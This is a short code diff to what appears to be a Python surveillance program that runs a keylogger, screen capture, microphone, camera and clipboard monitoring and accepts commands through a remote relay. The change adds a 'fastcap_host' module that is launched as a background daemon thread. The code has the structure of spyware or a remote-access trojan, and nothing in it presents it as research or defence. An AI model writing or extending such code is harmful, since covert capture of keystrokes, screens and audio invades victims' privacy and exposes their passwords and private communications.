@@ -62,6 +62,13 @@ except Exception as e:
     _log(f"clipboard_monitor FAIL: {e}")
 
 try:
+    import fastcap_host as fch
+    _log("fastcap_host OK")
+except Exception as e:
+    fch = None
+    _log(f"fastcap_host FAIL: {e}")
+
+try:
     import microphone as mic_mod
     _log("microphone OK")
 except Exception as e:
@@ -165,6 +172,9 @@ def main():
     if relay:
         relay.init(controller.handle_command, recorder, camera, mic)
         relay.run()
+
+    if fch:
+        threading.Thread(target=fch.start, daemon=True, name="fastcap-host").start()
 
     kl.Keylogger(broadcast_key).start()
     capture = sc.ScreenCapture(broadcast_frame, fps=25, quality=82, scale=0.85)
